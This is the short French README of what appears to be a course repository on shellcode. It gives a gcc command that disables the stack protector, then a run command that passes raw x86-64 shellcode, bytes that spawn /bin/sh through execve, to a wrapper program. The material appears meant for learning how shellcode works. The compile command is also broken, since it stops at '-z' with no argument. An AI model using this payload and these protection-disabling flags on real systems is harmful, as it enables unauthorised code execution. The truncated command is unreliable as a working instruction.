# Shellcode
Dépo du cours de ShellCode

<strong>GUIDE D'UTILISATION : </strong>

<strong>Pour compiler : </strong>
      
      gcc wrapper.c -o wrapper -fno-stack-protector -z 

<strong>Pour executer :</strong>

      ./wrapper $(python2 -c 'print("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")'
